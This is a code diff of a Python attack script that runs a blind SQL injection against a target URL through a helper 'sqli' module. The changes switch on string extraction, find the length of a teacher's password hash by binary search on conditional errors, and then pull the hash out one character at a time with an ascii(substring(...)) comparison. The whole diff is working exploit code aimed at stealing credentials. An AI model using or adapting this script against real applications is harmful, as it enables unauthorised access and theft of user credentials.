@@ -4,7 +4,7 @@ from sqli import question
 from sqli import get_length
 from sqli import get_count
 from sqli import binary_search
-#from sqli import get_string
+from sqli import get_string
 import requests
 
 req = lambda url: requests.get(url)
@@ -80,8 +80,8 @@ hash_len = get_length(
 print(F"Length of teacher hash: {hash_len}")
 '''
 # binary search
-length_q= lambda sub_query,i: F"select length(({sub_query}))>{i}"
-test = binary_search(
+length_q= lambda sub_query,mid: F"select length(({sub_query}))>{mid}"
+hash_len = binary_search(
     req=req,
     sqli_truth_condition=conditional_error,
     url=url,
@@ -94,7 +94,18 @@ test = binary_search(
     comment="%23",
     debug=False
 )
-print(F"Lenth of teacher hash this time binary search: {test}")
-'''
-teacher_hash = get_string(url=url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, strlen=hash_len, query_encoder=query_encoder)
-'''
+print(F"Length of teacher hash this time binary search: {hash_len}")
+str_exfil = lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}"
+teacher_hash = get_string(
+    req=req,
+    sqli_truth_condition=conditional_error,
+    url=url,
+    base_query=blind_sqli_truthy,
+    outer_query=str_exfil,
+    inner_query=teacher_hash_query,
+    strlen=hash_len,
+    query_encoder=query_encoder,
+    comment="%23",
+    debug=False
+)
+print(F"Extracted teacher hash: {teacher_hash}")
